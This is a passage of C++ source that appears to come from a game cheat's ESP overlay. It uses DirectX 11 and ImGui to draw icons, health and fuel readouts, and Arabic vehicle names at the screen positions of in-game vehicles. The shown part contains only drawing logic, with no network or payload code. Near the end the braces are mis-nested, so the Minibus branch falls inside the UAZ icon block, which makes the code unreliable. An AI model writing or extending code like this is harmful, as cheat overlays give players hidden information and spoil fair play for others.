														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 87, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 87.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_Bike && Vehicle.Name == u8"ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_Bike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 56, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 56.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}
											if (Setting::vahicle_Text_item_ATV2 && Vehicle.Name == u8"ﻲﻓ ﻲﺗ ﻱﺃ")
											{
												if (Setting::vahicle_Text_item_ATV2_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{

													std::string hpveh;


													DX11::ImGui_DX11::DrawHPVEH(Screen.X - 15, Screen.Y + 30, 52, 5.0f, Vehicle.hp);

												}
												if (Setting::feul)
												{


													DX11::ImGui_DX11::DrawOailVEH(Screen.X - 15, Screen.Y + 18, 52.00f, 5.0, Vehicle.oil);

												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X - 16, Screen.Y + 2, color, true);
												continue;
											}


										}
										else if (VehicleStyle == 2)
										{
											if (Setting::vahicle_Text_item_Plane && Vehicle.Name == u8"ﺓﺮﺋﺎﻃ")
											{

												if (Setting::vahicle_Text_item_Plane_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Plane, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);

												continue;
											}
											if (Setting::vahicle_Text_item_SnowBoard && Vehicle.Name == u8"ﺞﻟﺰﺘﻟﺍ ﺡﻮﻟ")
											{

												if (Setting::vahicle_Text_item_SnowBoard_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBoard, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);

												continue;
											}
											if (Setting::vahicle_Text_item_Helicopter && Vehicle.Name == u8"ﺮﺘﺑﻮﻜﻴﻠﻫ")
											{

												if (Setting::vahicle_Text_item_Helicopter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Helicopter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);

												continue;
											}
											if (Setting::vahicle_Text_item_Snowmobile && Vehicle.Name == u8"ﺪﻴﻠﺟ ﺔﻓﺎﺣﺯ")
											{

												if (Setting::vahicle_Text_item_Snowmobile_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Snowmobile, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_BRDM && Vehicle.Name == u8"ﻡﺇ ﻱﺩ ﺭﺃ ﻲﺑ")
											{

												if (Setting::vahicle_Text_item_BRDM_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::BRDM, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Capsule && Vehicle.Name == u8"Capsule")
											{
												if (Setting::vahicle_Text_item_Capsule_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Capsule, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Coupe && Vehicle.Name == u8"ﻪﻴﺑﻮﻛ")
											{
												if (Setting::vahicle_Text_item_Coupe_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Coupe, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_UTV && Vehicle.Name == u8"ﻲﻓ ﻲﺗ ﻮﻳ")
											{
												if (Setting::vahicle_Text_item_UTV_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UTV, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_ATV2 && Vehicle.Name == u8"ﻲﻓ ﻲﺗ ﻱﺃ")
											{
												if (Setting::vahicle_Text_item_ATV2_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::ATV2, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_SnowBike && Vehicle.Name == u8"ﺔﻴﺠﻠﺛ ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_SnowBike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::SnowBike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Bike && Vehicle.Name == u8"ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_Bike_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Bike, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_PickUpTruck && Vehicle.Name == u8"ﺓﺮﻴﻐﺻ ﺔﻨﺣﺎﺷ")
											{
												if (Setting::vahicle_Text_item_PickUpTruck_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::PickUpTruck, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Scooter && Vehicle.Name == u8"ﺮﺗﻮﻜﺳ")
											{
												if (Setting::vahicle_Text_item_Scooter_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Scooter, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle && Vehicle.Name == u8"ﺔﻳﺭﺎﻧ ﺔﺟﺍﺭﺩ")
											{
												if (Setting::vahicle_Text_item_Motorcycle_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Motorcycle3 && Vehicle.Name == u8"Motorcycle 3")
											{
												if (Setting::vahicle_Text_item_Motorcycle3_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Motorcycle3, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Tuk && Vehicle.Name == u8"ﻙﻮﺘﻛﻮﺗ")
											{
												if (Setting::vahicle_Text_item_Tuk_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Tuk, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Buggy && Vehicle.Name == u8"ﻲﺟﺎﺑ")
											{
												if (Setting::vahicle_Text_item_Buggy_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Buggy, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Sports && Vehicle.Name == u8"ﻭﺩﺍﺮﻴﻣ")
											{
												if (Setting::vahicle_Text_item_Sports_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Sports, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}
												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Dacia && Vehicle.Name == u8"ﺎﻴﺳﺍﺩ")
											{
												if (Setting::vahicle_Text_item_Dacia_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Dacia, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_Rony && Vehicle.Name == u8"ﻲﻧﻭﺭ")
											{
												if (Setting::vahicle_Text_item_Rony_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::Rony, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
												}

												if (Setting::hp)
												{
													std::string fuel;

													fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
												}

												if (Setting::feul)
												{
													DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
												}
												continue;
											}
											if (Setting::vahicle_Text_item_UAZ && Vehicle.Name == u8"ﺐﻴﺟ")
											{
												if (Setting::vahicle_Text_item_UAZ_Icon)
												{
													if (Setting::Vehicle_Icon_With_BG)
													{
														DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													else
													{
														DX11::ImGui_DX11::DrawImage(DX11::UAZ, Screen.X - 5, Screen.Y - 45, 50, 40);
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
													}
													continue;
												}
												if (Setting::vahicle_Text_item_Minibus && Vehicle.Name == u8"ﺓﺮﻴﻐﺻ ﺔﻠﻓﺎﺣ")
												{
													if (Setting::vahicle_Text_item_Minibus_Icon)
													{
														if (Setting::Vehicle_Icon_With_BG)
														{
															DX11::ImGui_DX11::DrawCircle2(Screen.X + 20, Screen.Y - 25, vehbgsize, ImColor(vehbgcolor[0], vehbgcolor[1], vehbgcolor[2], vehbgcolor[3]));
															DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
														else
														{
															DX11::ImGui_DX11::DrawImage(DX11::Minibus, Screen.X - 5, Screen.Y - 45, 50, 40);
														}
													}
													if (Setting::hp)
													{
														std::string fuel;

														fuel.append(u8"ﻦﻳﺰﻨﺑ:").append(std::to_string((int)(Vehicle.oil)).append(u8"% - ﺔﺤﺻ:").append(std::to_string((int)(Vehicle.hp)).append(u8"%")));
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, fuel, Screen.X, Screen.Y + 15, ImColor(255, 255, 255, 255), true);
													}

													if (Setting::feul)
													{
														DX11::ImGui_DX11::DrawBorderString(DX11::ImGui_DX11::pRegularFont, vehisize, Text, Screen.X, Screen.Y, color, true);
													}
													continue;
												}
